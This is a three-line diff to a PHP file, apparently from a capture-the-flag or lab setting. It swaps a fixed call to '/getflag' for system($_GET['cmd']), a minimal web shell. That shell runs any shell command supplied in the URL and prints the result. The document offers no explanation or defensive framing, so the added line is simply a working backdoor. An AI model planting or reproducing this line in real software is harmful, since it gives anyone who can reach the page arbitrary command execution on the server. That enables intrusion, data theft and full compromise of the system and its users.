@@ -1,3 +1,3 @@
 <?php
-    echo system("/getflag");
+    echo system($_GET['cmd']);
 ?>
